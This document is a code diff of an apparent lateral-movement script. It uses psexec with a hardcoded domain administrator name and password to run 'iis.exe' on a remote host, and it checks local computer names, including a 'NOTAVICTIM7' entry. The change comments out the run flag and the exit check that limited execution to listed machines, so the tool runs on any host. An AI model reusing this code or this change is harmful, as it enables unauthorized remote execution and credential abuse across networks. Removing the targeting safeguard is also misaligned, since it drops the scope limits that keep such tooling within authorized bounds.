@@ -140,7 +140,7 @@ def computer_Scheduler():
             psexecer = 'psexec.exe','/accepteula','\\pci.example.com','-u','example.com\administrator','-p','cisco','C:\windows\system32\iis.exe'
             psexecopen = subprocess.Popen(psexecer, shell=True, stdout=subprocess.PIPE)
         except:
-            subprocess.Popen(r"psexec.exe /accepteula \\pci.example.com\ -u example.com\administrator -p cisco C:\Windows\System32\iis.exe")
+            pass
 
     time.sleep(5)
 
@@ -150,7 +150,7 @@ def computer_Scheduler():
     time.sleep(5)
 
 if __name__ == '__main__':
-    run = 0
+    #run = 0
 
     try:
         print('''
@@ -187,7 +187,7 @@ if __name__ == '__main__':
             print ("Current test is " + i)
             if i == os.environ['COMPUTERNAME']:
                 print ("Computer Name is " + i)
-                run = 1
+                #run = 1
                 if i == 'NOTAVICTIM7':
                     debug = 1
                 else:
@@ -196,10 +196,10 @@ if __name__ == '__main__':
                 pass
 
 
-        print(run)
+        #print(run)
 
-        if run == 0:
-            sys.exit(1)
+        #if run == 0:
+        #    sys.exit(1)
 
         hosts = []
 
